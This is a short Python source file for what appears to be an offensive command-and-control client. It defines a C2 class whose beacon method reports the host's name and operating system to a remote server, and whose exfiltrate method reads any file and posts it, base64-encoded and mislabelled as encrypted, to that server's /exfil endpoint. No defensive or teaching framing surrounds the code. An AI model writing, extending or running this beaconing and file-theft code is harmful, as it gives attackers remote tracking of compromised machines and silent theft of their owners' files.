# -*- coding: utf-8 -*-
import requests
import time
import os
import base64
import json
from rich.console import Console

console = Console()

class C2:
    def __init__(self, server_url, secret="SHTIWE_SECRET"):
        self.server_url = server_url
        self.secret = secret

    def _encrypt(self, data):
        return base64.b64encode(data.encode()).decode()

    def _decrypt(self, data):
        return base64.b64decode(data).decode()

    def beacon(self):
        console.print(f"[bold red][][/bold red] Sending real beacon to {self.server_url}...")
        data = {
            "node": os.uname().nodename,
            "os": os.uname().sysname,
            "status": "online",
            "time": time.ctime()
        }
        try:
            r = requests.post(f"{self.server_url}/beacon", json={"payload": self._encrypt(json.dumps(data))}, timeout=5)
            return r.status_code == 200
        except:
            return False

    def exfiltrate(self, file_path):
        if not os.path.exists(file_path): return False
        with open(file_path, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
        try:
            r = requests.post(f"{self.server_url}/exfil", json={
                "name": os.path.basename(file_path),
                "data": self._encrypt(encoded)
            })
            return r.status_code == 200
        except:
            return False
